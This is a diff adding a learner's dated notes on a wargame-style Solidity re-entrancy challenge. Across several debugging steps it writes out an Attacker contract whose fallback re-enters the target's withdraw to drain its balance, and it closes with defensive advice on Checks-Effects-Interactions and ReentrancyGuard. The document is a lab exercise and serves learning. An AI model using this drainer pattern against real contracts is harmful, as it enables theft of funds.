@@ -1,0 +1,141 @@
+Re-entrancy
+Difficulty 6/10
+
+The goal of this level is for you to steal all the funds from the contract.
+
+  Things that might help:
+
+Untrusted contracts can execute code where you least expect it.
+Fallback methods
+Throw/revert bubbling
+Sometimes the best way to attack a contract is with another contract.
+See the Help page above, section "Beyond the console"
+
+220311 20:03 KST
+I think I just need to make a contract that has a fallback function
+which direct back to withdraw. But I do want to know what the term Throw/revert bubbling means.
+aa.. okay. pretty obvious. 
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+
+contract Attacker {
+
+    address _addr = 0xF8dB20f7C0e4F37ccd9Bdb471A0E9479B66EAAd4;
+    function paySomeone() public payable {
+    
+    (bool success1, ) = _addr.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
+    require(success1, "not working");
+    }
+              // function donate(address _to) public payable
+        //   function withdraw(uint _amount) public {
+    // (bool success, ) = _addr.call{value: msg.value}("");
+    fallback() payable external {
+ 
+    (bool success1, ) = _addr.call(abi.encodeWithSignature("withdraw(uint)", 0.001 ether));
+    require(success1, "faileddd");
+    }
+
+}
+
+220312 15:49 KST
+
+maan. I don't know why I cannot withdraw the money.
+
+220314 01:05 KST
+
+Okay. Let's try it again with pragma 0.6.0. 0.8.0 definitely did not really work.
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.5;
+
+
+contract Attacker {
+
+    address _addr = 0xF8dB20f7C0e4F37ccd9Bdb471A0E9479B66EAAd4;
+    address public thisContract = address(this);
+    
+    function paySomeone() public payable {
+    
+    (bool success1, ) = _addr.call{value: msg.value}(abi.encodeWithSignature("donate(address)", thisContract));
+    require(success1, "not working");
+    }
+              // function donate(address _to) public payable
+        //   function withdraw(uint _amount) public {
+    // (bool success, ) = _addr.call{value: msg.value}("");
+    function withdraw() external {
+        (bool success1, ) = _addr.call(abi.encodeWithSignature("withdraw(uint)", 1000000000000000));
+        require(success1, "faileddd");
+    }
+
+    fallback() payable external {
+        if(_addr.balance >= 1000000000000000){
+        (bool success1, ) = _addr.call(abi.encodeWithSignature("withdraw(uint)", 1000000000000000));
+            require(success1, "failed again");
+        }
+    }
+
+
+}
+
+I will try code above
+
+
+220314 01:17 KST
+You see, the problem is. even though the instance smart contract receives eth normally,
+it does not record balance of donator properly.
+
+I will just try to press buttons on remix
+
+??? when I check it with remix, the balance is proper
+
+
+220314 01:29 KST
+ohhhhhhh
+I had to put 
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.5;
+
+
+contract Attacker {
+
+    address _addr = 0x1408E49F7943fD179Eb69F06d63fc682183C3423;
+    address public thisContract = address(this);
+    
+    function paySomeone() public payable {
+    
+    (bool success1, ) = _addr.call{value: msg.value}(abi.encodeWithSignature("donate(address)", thisContract));
+    require(success1, "not working");
+    }
+              // function donate(address _to) public payable
+        //   function withdraw(uint _amount) public {
+    // (bool success, ) = _addr.call{value: msg.value}("");
+    function withdraww() external {
+        (bool success1, ) = _addr.call(abi.encodeWithSignature("withdraw(uint256)", 1000000000000000));
+        require(success1, "faileddd");
+    }
+
+    fallback() payable external {
+        if(_addr.balance >= 1000000000000000){
+        (bool success1, ) = _addr.call(abi.encodeWithSignature("withdraw(uint256)", 1000000000000000));
+            require(success1, "failed again");
+        }
+    }
+
+
+}
+
+"withdraw(uint256)"  needed to put uint256!!! shiit!!!! 
+
+
+In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.
+
+transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.
+
+Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.
+
+Re-entrancy is a common attack. You should always be prepared for it!
+
